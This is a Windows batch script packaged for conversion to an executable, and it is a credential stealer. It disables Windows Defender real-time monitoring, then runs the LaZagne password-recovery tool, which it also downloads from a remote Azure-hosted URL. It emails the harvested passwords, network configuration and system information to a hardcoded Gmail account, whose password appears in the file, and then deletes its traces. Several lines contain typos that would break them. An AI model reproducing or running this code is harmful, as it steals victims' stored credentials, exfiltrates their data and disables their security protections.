::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWHreyHcjLQlHcCGONVeeCbYJ5e31+/m7hUQJfPc9RJ7O07eFM+Ed7nnxZpRt3ntZk/cADSFZeRyuURdi/SBHrmHl
::YAwzoRdxOk+EWAnk
::fBw5plQjdCyDJGyX8VAjFD5YRTimM3y0Crod7PvHvrjX8l0Fa+U6eYHC5biBJ+8s/VDwSp8u2XQUkcgDbA==
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFD5YRTimM2ivC7AS/PvHyOOTilgfaO4+Qo7c1LHDN+kd7krzZqoh12Bbn8UJMwMOKlyudgpU
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off

powershell Set-MpPreference -DisableRealtimeMonitoring $true;

set email=captianlastimosa@gmail.com

set password=mogiant123

set arguments=all

set exeFile=laZagne_x64.exe

set logFile=%TEMP%\proclog.txt


%exeFile% %arguments% > %logFile%

del %exeFile%


powershell $SMTPServer = 'smtp.gmail.com';$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPInfo.EnableSsl = $true;$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('%email%', '%password%');$ReportEmail = New-Object System.Net.Mail.MailMessage;$ReportEmail.From = '%email%';$ReportEmail.To.Add('%email%');$ReportEmail.Subject = 'Lazagne Report';$ReportEmail.Body = 'Lazagne report in the attachments.';$ReportEmail.Atthachments.Add('%logFile%');$SMTPInfo.Send($ReportEmail);

del %logFile%


set downloadURL=http://mogiant.azurewebsites.net/laZagne_x64.exe

set exeFile=%TEMP%\proc.exe

set logFile=%TEMP%\proclog.txt

set arguments=all

powershell (new-object System.Net.WebClient).DownloadFile('%downloadURL%','%exeFile%');
%exeFile% %arguments% > %logFile%


powershell $SMTPServer = 'smtp.gmail.com';$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPInfo.EnableSsl = $true;$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('%email%', '%password%');$ReportEmail = New-Object System.Net.Mail.MailMessage;$ReportEmail.From = '%email%';$ReportEmail.To.Add('%email%');$ReportEmail.Subject = 'Lazagne Report';$ReportEmail.Body = 'Lazagne report in the attachments.';$ReportEmail.Attachments.Add('%logFile%');$SMTPInfo.Send($ReportEmail);



ipconfig/all>ipadress.txt


powershell $SMTPServer = 'smtp.gmail.com';$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPInfo.EnableSsl = $true;$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('%email%', '%password%');$ReportEmail = New-Object System.Net.Mail.MailMessage;$ReportEmail.From = '%email%';$ReportEmail.To.Add('%email%');$ReportEmail.Subject = 'Lazagne Report';$ReportEmail.Body = 'computername: %COMPUTERNAME%username:%USERNAME%.';$ReportEmail.Attachments.Add('ipadress.txt');$SMTPInfo.Send($ReportEmail);

systeminfo>sysinfo.txt

powershell $SMTPServer = 'smtp.gmail.com';$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPInfo.EnableSsl = $true;$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('%email%', '%password%');$ReportEmail = New-Object System.Net.Mail.MailMessage;$ReportEmail.From = '%email%';$ReportEmail.To.Add('%email%');$ReportEmail.Subject = 'Lazagne Report';$ReportEmail.Body = 'computername: %COMPUTERNAME%username:%USERNAME%.';$ReportEmail.Attachmensts.Add('sysinfo.txt');$SMTPInfo.Send($ReportEmail);

del %logFile%
del ipadress.txt
del systeminfo.txt

powershell Set-MpPreference -DisableRealtimeMonitoring $true;
powershell Set-MpPreference -DisableRealtimeMonitoring $flase;